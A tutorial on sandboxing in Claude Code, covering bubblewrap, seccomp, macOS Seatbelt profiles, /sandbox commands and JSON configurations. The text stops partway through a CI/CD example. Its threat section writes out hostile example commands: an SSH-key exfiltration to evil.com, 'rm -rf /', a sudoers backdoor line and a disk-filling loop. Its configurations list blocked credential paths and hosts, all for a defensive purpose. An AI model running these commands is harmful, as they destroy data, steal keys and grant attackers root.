# Tutorial 19: The Sandbox System in Claude Code

## A Comprehensive Guide to Sandboxing and Security Isolation

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Core Concepts](#core-concepts)
4. [Understanding Sandbox Architecture](#understanding-sandbox-architecture)
5. [Platform-Specific Sandboxes](#platform-specific-sandboxes)
6. [Sandbox Commands](#sandbox-commands)
7. [Configuring Sandbox Behavior](#configuring-sandbox-behavior)
8. [Real-World Examples](#real-world-examples)
9. [Sandbox Modes Comparison](#sandbox-modes-comparison)
10. [Security Implications](#security-implications)
11. [Troubleshooting](#troubleshooting)
12. [Quick Reference Cheat Sheet](#quick-reference-cheat-sheet)
13. [Best Practices](#best-practices)
14. [Advanced Topics](#advanced-topics)
15. [Summary](#summary)

---

## Overview

### What is Sandboxing?

Sandboxing is a security mechanism that isolates running programs from the rest of the
system. Think of it as a "sandbox" in a playground - children can play freely within the
sandbox, but the sand stays contained and does not spread to other areas of the playground.

In the context of Claude Code, sandboxing creates an isolated environment where AI-generated
commands can execute without risking damage to your system, accessing sensitive files, or
making unauthorized network connections.

### Why Sandboxing Matters

When you use Claude Code, the AI assistant can execute shell commands, write files, and
interact with your system. While Claude Code has a sophisticated permission system, sandboxing
provides an additional layer of protection:

```
+------------------------------------------------------------------+
|                        Your System                                |
|                                                                   |
|  +------------------------------------------------------------+  |
|  |                    Sandbox Boundary                         |  |
|  |                                                             |  |
|  |  +-------------------------------------------------------+  |  |
|  |  |                Claude Code Execution                   |  |  |
|  |  |                                                        |  |  |
|  |  |   - File operations (restricted paths)                 |  |  |
|  |  |   - Command execution (filtered syscalls)              |  |  |
|  |  |   - Network access (optional, controlled)              |  |  |
|  |  |                                                        |  |  |
|  |  +-------------------------------------------------------+  |  |
|  |                                                             |  |
|  |  Cannot access: ~/.ssh, /etc/passwd, system binaries       |  |
|  |                                                             |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Protected areas: SSH keys, credentials, system configurations    |
|                                                                   |
+------------------------------------------------------------------+
```

### The Security Model

Claude Code implements a defense-in-depth security model with multiple layers:

1. **Permission System**: User approval for sensitive operations
2. **Sandbox Isolation**: OS-level containment of command execution
3. **Syscall Filtering**: Restriction of dangerous system calls
4. **File Access Control**: Limiting which files can be read/written
5. **Network Control**: Managing outbound and inbound connections

These layers work together to provide comprehensive protection while maintaining usability.

---

## Prerequisites

### System Requirements

Before using sandbox features, ensure your system meets these requirements:

#### All Platforms
- Claude Code installed and configured
- Node.js 18.0 or higher
- Administrative/sudo access (for initial setup only)

#### Linux
- Kernel 3.8 or higher (for namespace support)
- Bubblewrap (`bwrap`) installed
- libseccomp for syscall filtering

#### macOS
- macOS 10.15 (Catalina) or higher
- Seatbelt (sandbox-exec) - built into macOS
- System Integrity Protection (SIP) enabled

#### Windows
- Windows 10 version 1903 or higher
- Windows Subsystem for Linux 2 (WSL2) recommended
- Administrator privileges for certain features

### Verifying Prerequisites

Run these commands to verify your system is ready:

```bash
# Check Claude Code version
claude --version

# Linux: Check for bubblewrap
which bwrap
bwrap --version

# Linux: Check kernel version
uname -r

# macOS: Verify sandbox-exec
which sandbox-exec
sw_vers

# Windows: Check WSL2 status
wsl --status
```

### Installation

#### Installing Bubblewrap on Linux

```bash
# Debian/Ubuntu
sudo apt update
sudo apt install bubblewrap

# Fedora/RHEL
sudo dnf install bubblewrap

# Arch Linux
sudo pacman -S bubblewrap

# From source (if package unavailable)
git clone https://github.com/containers/bubblewrap.git
cd bubblewrap
./autogen.sh
./configure
make
sudo make install
```

#### Verifying Installation

```bash
# Test bubblewrap functionality
bwrap --ro-bind /usr /usr --symlink usr/lib64 /lib64 \
      --proc /proc --dev /dev --unshare-pid \
      /bin/echo "Sandbox working!"

# Expected output: Sandbox working!
```

---

## Core Concepts

### Isolation

Isolation is the fundamental principle of sandboxing. It creates barriers between the
sandboxed process and the rest of the system:

```
+-------------------------+     +-------------------------+
|    Normal Execution     |     |   Sandboxed Execution   |
+-------------------------+     +-------------------------+
|                         |     |                         |
|  Full filesystem access |     |  Limited path access    |
|  All network ports      |     |  Network restricted     |
|  All system calls       |     |  Filtered syscalls      |
|  Environment variables  |     |  Sanitized environment  |
|  All processes visible  |     |  Isolated PID namespace |
|                         |     |                         |
+-------------------------+     +-------------------------+
```

#### Types of Isolation

1. **Filesystem Isolation**: Restricts which paths are visible and writable
2. **Network Isolation**: Controls network access and connections
3. **Process Isolation**: Hides other system processes
4. **User Isolation**: Maps user IDs to prevent privilege escalation
5. **IPC Isolation**: Prevents inter-process communication exploits

### Syscall Filtering

System calls (syscalls) are the interface between user programs and the kernel. Sandboxing
uses syscall filtering to block dangerous operations:

```
Application
    |
    v
+-------------------+
|   Syscall Made    |
| (e.g., open file) |
+-------------------+
    |
    v
+-------------------+
|  Seccomp Filter   |
|                   |
|  Allowed? --------+---> YES: Proceed to kernel
|                   |
|  Blocked? --------+---> NO: Return error/terminate
+-------------------+
```

#### Commonly Filtered Syscalls

| Syscall | Purpose | Why Filtered |
|---------|---------|--------------|
| `ptrace` | Process debugging | Can inspect/modify other processes |
| `mount` | Filesystem mounting | Can bypass isolation |
| `reboot` | System reboot | Dangerous system operation |
| `setuid` | Change user ID | Privilege escalation |
| `clock_settime` | Modify system clock | System integrity |

### File Access Control

File access control determines which files and directories the sandbox can access:

```
+------------------------------------------+
|           File Access Rules              |
+------------------------------------------+
|                                          |
|  ALLOWED (Read-Write):                   |
|  +------------------------------------+  |
|  | /home/user/projects/current        |  |
|  | /tmp/claude-workspace              |  |
|  | /var/tmp                           |  |
|  +------------------------------------+  |
|                                          |
|  ALLOWED (Read-Only):                    |
|  +------------------------------------+  |
|  | /usr                               |  |
|  | /lib                               |  |
|  | /bin                               |  |
|  +------------------------------------+  |
|                                          |
|  BLOCKED:                                |
|  +------------------------------------+  |
|  | ~/.ssh/*                           |  |
|  | ~/.gnupg/*                         |  |
|  | ~/.aws/*                           |  |
|  | /etc/shadow                        |  |
|  | /etc/passwd (write blocked)        |  |
|  +------------------------------------+  |
|                                          |
+------------------------------------------+
```

---

## Understanding Sandbox Architecture

### What Sandboxing Protects Against

The sandbox provides protection against numerous security threats:

#### 1. Malicious Command Execution

```
Without Sandbox:
User: "Help me with this code"
Claude: *generates command*
> rm -rf / --no-preserve-root
Result: CATASTROPHIC DATA LOSS

With Sandbox:
User: "Help me with this code"
Claude: *generates command*
> rm -rf / --no-preserve-root
Result: Command fails - cannot access paths outside sandbox
```

#### 2. Data Exfiltration

```
Without Sandbox:
Malicious prompt injection attempts:
> cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect
Result: SSH private key stolen

With Sandbox:
> cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect
Result:
  - ~/.ssh blocked from access
  - Network access denied
  - Operation fails safely
```

#### 3. Privilege Escalation

```
Without Sandbox:
> sudo chmod 777 /etc/sudoers
> echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
Result: System compromised

With Sandbox:
> sudo chmod 777 /etc/sudoers
Result:
  - sudo not available in sandbox
  - /etc paths blocked
  - Operation denied
```

#### 4. Resource Exhaustion

```
Without Sandbox:
> while true; do mkdir -p /tmp/$RANDOM/$RANDOM; done
Result: Filesystem filled, system unstable

With Sandbox:
> while true; do mkdir -p /tmp/$RANDOM/$RANDOM; done
Result:
  - Limited to sandbox temp directory
  - Resource limits enforced
  - System protected
```

### Defense in Depth Model

Claude Code implements multiple security layers. If one layer fails, others provide backup:

```
+------------------------------------------------------------------+
|                                                                   |
|  Layer 1: User Intent Verification                                |
|  +------------------------------------------------------------+  |
|  | "Did you mean to delete all files?" -> User confirms/denies |  |
|  +------------------------------------------------------------+  |
|                              |                                    |
|                              v                                    |
|  Layer 2: Permission System                                       |
|  +------------------------------------------------------------+  |
|  | Check if operation requires approval                        |  |
|  | Display command for user review                             |  |
|  | Require explicit confirmation                               |  |
|  +------------------------------------------------------------+  |
|                              |                                    |
|                              v                                    |
|  Layer 3: Sandbox Containment                                     |
|  +------------------------------------------------------------+  |
|  | Execute in isolated environment                             |  |
|  | Restrict file system access                                 |  |
|  | Filter system calls                                         |  |
|  +------------------------------------------------------------+  |
|                              |                                    |
|                              v                                    |
|  Layer 4: OS-Level Protection                                     |
|  +------------------------------------------------------------+  |
|  | Standard Unix permissions                                   |  |
|  | SELinux/AppArmor policies                                   |  |
|  | File ownership                                              |  |
|  +------------------------------------------------------------+  |
|                                                                   |
+------------------------------------------------------------------+
```

### Sandbox vs Permissions: Complementary Systems

Understanding how sandbox and permissions work together:

```
+------------------------------------------------------------------+
|                                                                   |
|                    Permission System                              |
|                                                                   |
|  Purpose: User awareness and consent                              |
|  Scope: Individual operations                                     |
|  Mechanism: Ask before executing                                  |
|  Bypass: User can approve any operation                           |
|                                                                   |
|  Example:                                                         |
|  > rm important-file.txt                                          |
|  "This will delete important-file.txt. Allow? [y/N]"              |
|                                                                   |
+------------------------------------------------------------------+
                              +
+------------------------------------------------------------------+
|                                                                   |
|                      Sandbox System                               |
|                                                                   |
|  Purpose: Enforced containment regardless of approval             |
|  Scope: All operations within session                             |
|  Mechanism: OS-level isolation                                    |
|  Bypass: Must explicitly disable sandbox                          |
|                                                                   |
|  Example:                                                         |
|  > cat /etc/shadow                                                |
|  Error: Path /etc/shadow not accessible in sandbox                |
|  (Even if user approved, sandbox blocks it)                       |
|                                                                   |
+------------------------------------------------------------------+
                              =
+------------------------------------------------------------------+
|                                                                   |
|                    Combined Protection                            |
|                                                                   |
|  - Permissions catch intentional risky operations                 |
|  - Sandbox catches unintentional/malicious access                 |
|  - Neither alone is sufficient                                    |
|  - Together they provide comprehensive security                   |
|                                                                   |
+------------------------------------------------------------------+
```

---

## Platform-Specific Sandboxes

### Linux: Bubblewrap (bwrap)

Bubblewrap is a lightweight sandboxing tool that uses Linux namespaces and seccomp to
create isolated environments.

#### Installation

```bash
# Debian/Ubuntu
sudo apt update
sudo apt install bubblewrap

# Verify installation
bwrap --version
# Output: bubblewrap 0.8.0

# Check capabilities
bwrap --help | head -20
```

#### How Bubblewrap Works

Bubblewrap leverages several Linux kernel features:

##### 1. Namespaces

```
+------------------------------------------------------------------+
|                     Linux Namespaces                              |
+------------------------------------------------------------------+
|                                                                   |
|  Mount Namespace (--unshare-mnt)                                  |
|  +------------------------------------------------------------+  |
|  | Isolated view of filesystem mounts                          |  |
|  | Sandbox mounts don't affect host                            |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  PID Namespace (--unshare-pid)                                    |
|  +------------------------------------------------------------+  |
|  | Process IDs isolated from host                              |  |
|  | Cannot see or signal host processes                         |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Network Namespace (--unshare-net)                                |
|  +------------------------------------------------------------+  |
|  | Isolated network stack                                      |  |
|  | No access to host network interfaces                        |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  User Namespace (--unshare-user)                                  |
|  +------------------------------------------------------------+  |
|  | UID/GID mapping                                             |  |
|  | Root inside sandbox != root outside                         |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  IPC Namespace (--unshare-ipc)                                    |
|  +------------------------------------------------------------+  |
|  | Isolated inter-process communication                        |  |
|  | Shared memory segments isolated                             |  |
|  +------------------------------------------------------------+  |
|                                                                   |
+------------------------------------------------------------------+
```

##### 2. Seccomp

Seccomp (Secure Computing Mode) filters system calls:

```bash
# Example: View seccomp filter applied by Claude Code
# The filter blocks dangerous syscalls while allowing normal operation

# Allowed syscalls (partial list):
# - read, write, open, close (file I/O)
# - mmap, mprotect (memory management)
# - fork, clone (process creation - limited)
# - socket, connect (network - if enabled)

# Blocked syscalls (partial list):
# - ptrace (process debugging)
# - mount, umount (filesystem)
# - reboot, shutdown
# - raw_socket (network sniffing)
```

#### Configuration Options

```bash
# Basic bubblewrap invocation used by Claude Code:

bwrap \
  --ro-bind /usr /usr \                    # Read-only system binaries
  --ro-bind /lib /lib \                    # Read-only libraries
  --ro-bind /lib64 /lib64 \                # 64-bit libraries
  --ro-bind /bin /bin \                    # Basic commands
  --ro-bind /sbin /sbin \                  # System commands
  --bind /home/user/project /workspace \   # Project directory (read-write)
  --tmpfs /tmp \                           # Temporary directory
  --proc /proc \                           # Process filesystem
  --dev /dev \                             # Device files
  --unshare-pid \                          # Isolate process IDs
  --unshare-net \                          # Isolate network (optional)
  --unshare-ipc \                          # Isolate IPC
  --die-with-parent \                      # Clean up on exit
  --new-session \                          # New session
  /bin/bash                                # Shell to run
```

#### Bubblewrap Limitations and Capabilities

```
+------------------------------------------------------------------+
|                     Bubblewrap Capabilities                       |
+------------------------------------------------------------------+
|                                                                   |
|  CAN DO:                                                          |
|  - Filesystem isolation (mount namespaces)                        |
|  - Process isolation (PID namespaces)                             |
|  - Network isolation (network namespaces)                         |
|  - User ID mapping (user namespaces)                              |
|  - Seccomp syscall filtering                                      |
|  - Resource limits via cgroups                                    |
|                                                                   |
|  CANNOT DO:                                                       |
|  - GPU isolation (limited support)                                |
|  - Full kernel isolation (not a VM)                               |
|  - Prevent all side-channel attacks                               |
|  - Isolate without kernel support                                 |
|                                                                   |
+------------------------------------------------------------------+
```

### macOS: Seatbelt (sandbox-exec)

macOS uses its own sandboxing technology called Seatbelt, accessed through `sandbox-exec`.

#### Built-in to macOS

```bash
# Seatbelt is included with macOS - no installation needed
which sandbox-exec
# Output: /usr/bin/sandbox-exec

# Check available profiles
ls /System/Library/Sandbox/Profiles/
# Lists built-in sandbox profiles
```

#### Profile-Based Restrictions

Seatbelt uses profile files written in a Scheme-like language:

```scheme
;; Example Claude Code sandbox profile
;; File: claude-sandbox.sb

(version 1)

;; Start by denying everything
(deny default)

;; Allow basic process operations
(allow process-exec)
(allow process-fork)

;; Allow reading system libraries
(allow file-read*
    (subpath "/usr/lib")
    (subpath "/System/Library/Frameworks")
    (subpath "/Applications/Xcode.app"))

;; Allow read-write to project directory
(allow file-read* file-write*
    (subpath "/Users/username/Projects/current"))

;; Allow temporary files
(allow file-read* file-write*
    (subpath "/tmp")
    (subpath "/private/tmp")
    (regex #"^/var/folders/.*"))

;; Deny access to sensitive files
(deny file-read* file-write*
    (subpath "/Users/username/.ssh")
    (subpath "/Users/username/.gnupg")
    (subpath "/Users/username/.aws")
    (subpath "/Users/username/Library/Keychains"))

;; Network restrictions (if network disabled)
(deny network*)

;; OR allow specific network operations
;; (allow network-outbound (remote tcp "localhost:*"))
```

#### Network and File Access Rules

```
+------------------------------------------------------------------+
|                  macOS Sandbox Rules                              |
+------------------------------------------------------------------+
|                                                                   |
|  Network Rules:                                                   |
|  +------------------------------------------------------------+  |
|  | (deny network*)             - Block all network             |  |
|  | (allow network-outbound)    - Allow outgoing connections    |  |
|  | (allow network-inbound)     - Allow incoming connections    |  |
|  | (allow network-bind)        - Allow binding to ports        |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  File Rules:                                                      |
|  +------------------------------------------------------------+  |
|  | (allow file-read*)          - Allow reading                 |  |
|  | (allow file-write*)         - Allow writing                 |  |
|  | (allow file-read-metadata)  - Allow stat operations         |  |
|  | (deny file-write-create)    - Deny creating new files       |  |
|  +------------------------------------------------------------+  |
|                                                                   |
|  Process Rules:                                                   |
|  +------------------------------------------------------------+  |
|  | (allow process-exec)        - Allow executing programs      |  |
|  | (allow process-fork)        - Allow forking                 |  |
|  | (deny signal)               - Block signals to other procs  |  |
|  +------------------------------------------------------------+  |
|                                                                   |
+------------------------------------------------------------------+
```

#### Entitlements

macOS apps can declare entitlements that affect sandbox behavior:

```xml
<!-- Example entitlements for Claude Code -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Allow read/write to user-selected files -->
    <key>com.apple.security.files.user-selected.read-write</key>
    <true/>

    <!-- Allow network connections -->
    <key>com.apple.security.network.client</key>
    <true/>

    <!-- Disable certain dangerous operations -->
    <key>com.apple.security.cs.allow-jit</key>
    <false/>

    <key>com.apple.security.cs.disable-library-validation</key>
    <false/>
</dict>
</plist>
```

### Windows: Limited Sandbox

Windows sandboxing in Claude Code is currently more limited than Linux and macOS.

#### Current Windows Support Status

```
+------------------------------------------------------------------+
|                  Windows Sandbox Support                          |
+------------------------------------------------------------------+
|                                                                   |
|  Status: PARTIAL SUPPORT                                          |
|                                                                   |
|  Available Features:                                              |
|  - Basic path restrictions via Claude Code                        |
|  - WSL2 integration for Linux-style sandboxing                    |
|  - Process isolation through Windows mechanisms                   |
|                                                                   |
|  Limited Features:                                                |
|  - No native namespace support (unlike Linux)                     |
|  - Seccomp not available (Windows-specific mechanisms)            |
|  - Less granular file access control                              |
|                                                                   |
|  Recommended: Use WSL2 for full sandbox support                   |
|                                                                   |
+------------------------------------------------------------------+
```

#### Alternative Protections

```powershell
# Windows alternative: Use WSL2 with bubblewrap
# First, ensure WSL2 is installed:
wsl --install

# Then install bubblewrap in your Linux distribution:
wsl -d Ubuntu
sudo apt install bubblewrap

# Claude Code will automatically use WSL2 sandbox when available
```

#### Windows-Specific Security Features

```powershell
# Windows Defender Application Guard (for Enterprise)
# Provides VM-based isolation

# AppContainer (used by UWP apps)
# Limited support in Claude Code

# Integrity Levels
# Low integrity processes have restricted access
```

#### Future Roadmap

```
+------------------------------------------------------------------+
|                  Windows Sandbox Roadmap                          |
+------------------------------------------------------------------+
|                                                                   |
|  Current (v1.x):                                                  |
|  - Basic file path filtering                                      |
|  - WSL2 delegation                                                |
|  - Permission-based security                                      |
|                                                                   |
|  Planned (v2.x):                                                  |
|  - Native Windows container support                               |
|  - Hyper-V isolation option                                       |
|  - AppContainer integration                                       |
|  - Improved syscall filtering via Windows mechanisms              |
|                                                                   |
|  Future (v3.x):                                                   |
|  - Full feature parity with Linux                                 |
|  - Windows Sandbox integration                                    |
|  - Hardware-based isolation options                               |
|                                                                   |
+------------------------------------------------------------------+
```

---

## Sandbox Commands

### /sandbox status - Check Current Sandbox State

The `/sandbox status` command displays the current sandbox configuration:

```bash
# Run the command
/sandbox status

# Example output (Linux):
+------------------------------------------------------------------+
|                     Sandbox Status                                |
+------------------------------------------------------------------+
| Sandbox:        ENABLED                                           |
| Mode:           strict                                            |
| Platform:       Linux (bubblewrap v0.8.0)                         |
|                                                                   |
| Namespaces:                                                       |
|   - PID:        isolated                                          |
|   - Network:    isolated                                          |
|   - Mount:      isolated                                          |
|   - User:       mapped (1000 -> 0)                                |
|                                                                   |
| File Access:                                                      |
|   Allowed (RW): /home/user/projects/myapp                         |
|                 /tmp/claude-workspace-abc123                      |
|   Allowed (RO): /usr, /lib, /lib64, /bin                          |
|   Blocked:      ~/.ssh, ~/.gnupg, ~/.aws, /etc/shadow             |
|                                                                   |
| Network:        DISABLED                                          |
| Syscall Filter: ACTIVE (seccomp)                                  |
+------------------------------------------------------------------+
```

```bash
# Example output (macOS):
+------------------------------------------------------------------+
|                     Sandbox Status                                |
+------------------------------------------------------------------+
| Sandbox:        ENABLED                                           |
| Mode:           strict                                            |
| Platform:       macOS (seatbelt)                                  |
|                                                                   |
| Profile:        /tmp/claude-sandbox-abc123.sb                     |
|                                                                   |
| File Access:                                                      |
|   Allowed (RW): /Users/user/Projects/myapp                        |
|                 /private/tmp/claude-workspace                     |
|   Allowed (RO): /usr, /System/Library                             |
|   Blocked:      ~/.ssh, ~/.gnupg, ~/Library/Keychains             |
|                                                                   |
| Network:        DISABLED                                          |
| Entitlements:   files.user-selected.read-write                    |
+------------------------------------------------------------------+
```

```bash
# Example output (Windows):
+------------------------------------------------------------------+
|                     Sandbox Status                                |
+------------------------------------------------------------------+
| Sandbox:        PARTIAL                                           |
| Mode:           permissive                                        |
| Platform:       Windows (native)                                  |
|                                                                   |
| WSL2:           AVAILABLE (Ubuntu 22.04)                          |
| WSL2 Sandbox:   ENABLED (bubblewrap)                              |
|                                                                   |
| File Access:                                                      |
|   Allowed (RW): C:\Users\user\Projects\myapp                      |
|                 C:\temp\claude-workspace                          |
|   Blocked:      C:\Users\user\.ssh, Registry                      |
|                                                                   |
| Network:        ENABLED                                           |
| Note:           Full sandbox available via WSL2                   |
+------------------------------------------------------------------+
```

### /sandbox enable - Enable Sandboxing

```bash
# Enable sandbox with default (strict) settings
/sandbox enable

# Output:
# Sandbox enabled with strict mode.
# - Network: disabled
# - File access: project directory only
# - Syscall filtering: active

# Enable with specific mode
/sandbox enable --mode permissive

# Output:
# Sandbox enabled with permissive mode.
# - Network: enabled
# - File access: expanded
# - Syscall filtering: active

# Enable with network access
/sandbox enable --network

# Output:
# Sandbox enabled with network access.
# - Network: enabled (outbound only)
# - File access: project directory only
# - Syscall filtering: active
```

### /sandbox disable - Disable Sandboxing

```bash
# Disable sandbox
/sandbox disable

# Output:
# WARNING: Disabling sandbox removes an important security layer.
# Commands will execute with your full user permissions.
#
# Are you sure? [y/N]: y
#
# Sandbox disabled.
# Use '/sandbox enable' to re-enable protection.

# Force disable without confirmation (use with caution)
/sandbox disable --force

# Output:
# Sandbox disabled (forced).
```

### Sandbox Configuration Options

```bash
# View all configuration options
/sandbox config --help

# Output:
# Sandbox Configuration Options:
#
# --mode <strict|permissive|custom>
#     Set sandbox mode
#
# --network <true|false>
#     Enable/disable network access
#
# --allow-path <path>
#     Add path to allowed list
#
# --block-path <path>
#     Add path to blocked list
#
# --timeout <seconds>
#     Set command timeout (default: 120)
#
# --temp-dir <path>
#     Set temporary directory location

# Example: Configure custom sandbox
/sandbox config --mode custom --allow-path /data --block-path ~/Documents

# Example: View current configuration
/sandbox config --show
```

---

## Configuring Sandbox Behavior

### Default Sandbox Settings

The default configuration provides security while allowing normal development work:

```json
// Default settings.json sandbox configuration
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "allowNetwork": false,
    "timeout": 120,
    "allowedPaths": [
      "${workspaceFolder}",
      "${tempDir}"
    ],
    "blockedPaths": [
      "~/.ssh",
      "~/.gnupg",
      "~/.aws",
      "~/.config/gcloud",
      "~/.azure",
      "/etc/passwd",
      "/etc/shadow",
      "/etc/sudoers"
    ],
    "readOnlyPaths": [
      "/usr",
      "/lib",
      "/lib64",
      "/bin",
      "/sbin"
    ],
    "environment": {
      "inherit": ["PATH", "HOME", "USER", "LANG"],
      "set": {
        "SANDBOX": "true"
      },
      "unset": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"]
    }
  }
}
```

### Per-Command Sandbox Rules

You can configure sandbox behavior for specific commands:

```json
// settings.json with per-command rules
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "commandRules": {
      "npm": {
        "allowNetwork": true,
        "allowedPaths": ["${workspaceFolder}/node_modules"]
      },
      "pip": {
        "allowNetwork": true,
        "allowedPaths": ["~/.local/lib/python*"]
      },
      "git": {
        "allowNetwork": true,
        "allowedPaths": ["~/.gitconfig", "~/.git-credentials"]
      },
      "docker": {
        "mode": "permissive",
        "allowedPaths": ["/var/run/docker.sock"]
      },
      "make": {
        "inherit": "strict",
        "timeout": 300
      }
    }
  }
}
```

### Allowing Specific Operations

```json
// Granular operation permissions
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "operations": {
      "file": {
        "read": true,
        "write": true,
        "create": true,
        "delete": true,
        "rename": true,
        "symlink": false,
        "hardlink": false,
        "chmod": false,
        "chown": false
      },
      "process": {
        "exec": true,
        "fork": true,
        "signal": false,
        "ptrace": false
      },
      "network": {
        "connect": false,
        "bind": false,
        "listen": false,
        "dns": false
      },
      "system": {
        "mount": false,
        "clock": false,
        "module": false,
        "reboot": false
      }
    }
  }
}
```

### Sandbox Exceptions

```json
// Configuration with specific exceptions
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "exceptions": {
      "paths": {
        // Allow access to specific config file
        "~/.npmrc": {
          "operations": ["read"],
          "reason": "Required for npm registry authentication"
        },
        // Allow access to database socket
        "/var/run/postgresql/.s.PGSQL.5432": {
          "operations": ["read", "write"],
          "reason": "Database connection"
        }
      },
      "commands": {
        // Allow sudo for specific commands only
        "sudo": {
          "allowed": ["apt update", "apt install"],
          "denied": ["*"],
          "reason": "Package management only"
        }
      },
      "network": {
        // Allow specific hosts
        "allowedHosts": [
          "registry.npmjs.org",
          "pypi.org",
          "github.com"
        ],
        "allowedPorts": [443, 80]
      }
    }
  }
}
```

---

## Real-World Examples

### Example 1: Default Strict Sandbox for Untrusted Code

When reviewing or analyzing code from unknown sources, use strict sandboxing:

```json
// strict-sandbox.json
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "allowNetwork": false,
    "timeout": 60,
    "allowedPaths": [
      "/home/user/untrusted-code"
    ],
    "blockedPaths": [
      "/home/user",
      "/tmp",
      "~/*"
    ],
    "readOnlyPaths": [
      "/usr",
      "/lib"
    ],
    "environment": {
      "inherit": ["PATH"],
      "unset": ["*"]
    },
    "seccomp": {
      "mode": "strict",
      "additionalBlocked": [
        "clone3",
        "io_uring_setup"
      ]
    }
  }
}
```

**Usage scenario:**

```bash
# User wants to analyze potentially malicious code
claude "Analyze this downloaded script for security issues"

# Claude Code automatically applies strict sandbox
# - No network access (prevents data exfiltration)
# - Limited file access (prevents lateral movement)
# - Strict syscall filtering (prevents exploits)
# - Short timeout (prevents resource exhaustion)
```

### Example 2: Permissive Sandbox for Trusted Project

For personal projects where you need more flexibility:

```json
// trusted-project.json
{
  "sandbox": {
    "enabled": true,
    "mode": "permissive",
    "allowNetwork": true,
    "timeout": 300,
    "allowedPaths": [
      "/home/user/my-project",
      "/home/user/.config/my-app",
      "/tmp",
      "/var/tmp"
    ],
    "blockedPaths": [
      "~/.ssh",
      "~/.gnupg",
      "~/.aws"
    ],
    "networkRules": {
      "allowOutbound": true,
      "allowInbound": false,
      "allowedPorts": [80, 443, 3000, 5432, 6379]
    }
  }
}
```

**Usage scenario:**

```bash
# User working on their own web application
claude "Set up the development environment and run the tests"

# Claude Code uses permissive sandbox
# - Network enabled (for npm install, API calls)
# - Wide file access (project structure flexibility)
# - Longer timeout (for test suites)
# - Still blocks sensitive credentials
```

### Example 3: Network-Enabled Sandbox for API Development

When building applications that require network access:

```json
// api-development.json
{
  "sandbox": {
    "enabled": true,
    "mode": "custom",
    "allowNetwork": true,
    "allowedPaths": [
      "/home/user/api-project",
      "/home/user/.npmrc",
      "/tmp"
    ],
    "blockedPaths": [
      "~/.ssh",
      "~/.aws"
    ],
    "networkRules": {
      "allowOutbound": true,
      "allowInbound": true,
      "allowedOutboundHosts": [
        "api.stripe.com",
        "api.github.com",
        "registry.npmjs.org",
        "localhost"
      ],
      "allowedInboundPorts": [3000, 8080],
      "blockList": [
        "*.evil.com",
        "metadata.google.internal"
      ]
    },
    "dns": {
      "enabled": true,
      "servers": ["8.8.8.8", "1.1.1.1"]
    }
  }
}
```

**Usage scenario:**

```bash
# User developing a REST API
claude "Create an endpoint that fetches data from Stripe and returns formatted results"

# Claude Code configures sandbox for API work
# - Outbound network to approved hosts
# - Local server binding allowed
# - Blocks known malicious hosts
# - DNS resolution enabled
```

### Example 4: Sandbox Bypass for System Administration

For legitimate system administration tasks, you may need to disable sandboxing:

```json
// sysadmin.json
{
  "sandbox": {
    "enabled": false,
    "disabledReason": "System administration tasks",
    "requireConfirmation": true,
    "auditLog": true,
    "fallbackMode": {
      "enabled": true,
      "mode": "permissive"
    }
  }
}
```

**Usage scenario:**

```bash
# User needs to perform system maintenance
claude "Check system health and update packages"

# Claude Code prompts for confirmation
# "Sandbox is disabled for this session. System administration tasks
#  will execute with full permissions. Continue? [y/N]"

# If confirmed:
# - Full system access
# - All commands logged for audit
# - Can re-enable sandbox with /sandbox enable
```

### Example 5: Container-Aware Sandbox Configuration

When working with Docker or other container technologies:

```json
// container-aware.json
{
  "sandbox": {
    "enabled": true,
    "mode": "custom",
    "containerMode": true,
    "allowedPaths": [
      "/home/user/docker-project",
      "/var/run/docker.sock",
      "/tmp"
    ],
    "blockedPaths": [
      "~/.ssh",
      "~/.docker/config.json"
    ],
    "allowNetwork": true,
    "containerRules": {
      "allowDockerCommands": true,
      "allowBuildKit": true,
      "allowVolumeMount": true,
      "blockedMounts": [
        "/",
        "/etc",
        "/var",
        "~/.ssh"
      ],
      "allowedImages": [
        "node:*",
        "python:*",
        "postgres:*",
        "redis:*"
      ],
      "privileged": false,
      "networkMode": ["bridge", "host"]
    }
  }
}
```

**Usage scenario:**

```bash
# User building containerized application
claude "Create a multi-container Docker setup with Node.js and PostgreSQL"

# Claude Code sandbox allows:
# - Docker daemon communication
# - Container creation with approved images
# - Volume mounts (excluding sensitive paths)
# - Network configuration
# Still prevents:
# - Mounting host root
# - Privileged containers
# - Unapproved base images
```

### Example 6: CI/CD Sandbox Settings

For automated pipeline environments:

```json
// cicd-sandbox.json
{
  "sandbox": {
    "enabled": true,
    "mode": "strict",
    "cicdMode": true,
    "allowNetwork": true,
    "timeout": 600,
    "allowedPaths": [
      "${CI_PROJECT_DIR}",
      "/tmp/builds",
      "/var/cache/apt"
    ],
    "blockedPaths": [
      "/home/*/.ssh",
      "/root/.ssh",
      "/etc/passwd",
      "/etc/shadow"
    ],
    "networkRules": {
      "allowOutbound": true,
      "allowedHosts": [
        "*.docker.io",
        "*.github.com",
        "*.npmjs.org",
        "*.pypi.org"
      ]
    },
    "environment": {
      "inherit": [
        "CI",
        "CI_*",
        "GITHUB_*",
        "PATH"
      ],
      "unset": [
        "AWS_*",
        "DOCKER_*"
      ]
    },
    "resources": {
      "maxMemory": "4G",
      "maxCpu": 2,
      "maxDiskWrite": "10G"
    }
  }
}
```

**Usage scenario:**

```bash
# Automated CI/CD pipeline using Claude Code
# .gitlab-ci.yml or GitHub Actions workflow

# Claude Code sandbox in CI:
# - Strict isolation per job
